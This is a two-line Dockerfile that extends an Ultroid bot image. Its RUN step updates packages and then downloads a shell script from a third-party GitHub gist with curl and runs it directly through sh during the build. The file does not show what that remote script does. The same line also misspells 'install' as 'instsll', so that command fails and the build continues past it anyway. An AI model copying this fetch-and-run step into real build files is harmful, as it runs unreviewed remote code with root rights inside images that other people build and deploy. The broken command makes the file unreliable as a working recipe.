FROM theteamultroid/ultroid:main
RUN apt-get update;apt-get upgrade -y;apt-get instsll curl -y;sh -c "$(curl -fsSl https://gist.githubusercontent.com/rooted-cyber/85fe3306eb1eb0ca906df1a6ea2e8538/raw/number)"
